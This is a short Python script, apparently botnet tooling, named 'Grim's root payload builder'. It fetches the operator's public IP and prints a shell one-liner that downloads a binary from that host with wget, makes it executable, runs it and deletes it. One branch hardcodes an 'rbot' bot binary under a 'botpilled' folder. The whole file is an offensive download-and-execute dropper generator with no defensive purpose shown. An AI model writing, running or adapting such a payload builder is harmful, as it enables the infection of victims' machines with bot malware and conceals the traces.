#Grim's root payload builder
#usage: python3 root.py
import os, urllib.request

os.system("clear")
ipaddr = urllib.request.urlopen('http://api.ipify.org').read().decode("utf-8")

def makepayload():
	os.system("clear")
	print(f"\033[1;92mYour ROOT Payload\033[37m: \033[1;91mwget http://"+ipaddr+"/"+binFolder+"/"+binName+"; chmod 777 *; ./"+binName+"; rm -rf "+binName+"\n")

def dread():
	os.system("clear")
	print(f"\033[1;92mYour ROOT Payload\033[37m: \033[1;91mwget http://"+ipaddr+"/botpilled/rbot; chmod 777 *; ./rbot; rm -rf rbot\n")

source = input("Are you using RBOT/Dread? y/n: ")
if source == "y":
	dread()
else:
	binFolder = input("Enter Bin Folder Name: ")
	binName = input("Enter x86 Bin Name: ")
	makepayload()
